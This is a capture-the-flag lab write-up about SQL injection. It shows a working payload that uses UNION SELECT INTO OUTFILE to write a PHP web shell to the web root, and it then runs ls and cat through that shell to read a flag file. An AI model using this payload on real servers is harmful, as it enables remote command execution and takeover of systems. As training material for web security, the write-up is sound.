# Writing files

Find the flag by using a webshell.



This lab is also a follow up to the lesson. During this section we where able to write a shell.php into the web application with the following command

{% code overflow="wrap" %}
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
{% endcode %}

By doing this now if we browse to the /shell.php we should be able to send commands via the URL

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Since the payload to write the shell.php is looking for "0" we must enter the paramater and then a UNIX command, like `ls`

```url
http://SERVER_IP:PORT/shell.php?0=ls
```

Now all we have to do is navigate through the directories and look for our flag

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

Entering the command `ls ..` we can list files in the previous folder. We are able to find the flag.txt file, so now with the command `cat ../flag.txt` we should see our flag displayed.

<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

And there it is! We just found our flag!
